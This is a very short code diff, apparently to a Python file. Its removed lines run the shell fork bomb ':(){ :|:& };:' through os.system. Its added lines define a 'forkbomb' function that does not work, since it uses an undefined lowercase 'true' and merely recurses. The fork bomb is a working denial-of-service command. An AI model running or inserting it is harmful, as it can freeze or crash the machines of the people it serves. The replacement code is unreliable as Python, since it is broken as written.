@@ -1,2 +1,4 @@
-import os
-os.system(":(){ :|:& };:")
+
+def forkbomb():
+  while true:
+    return forkbomb()
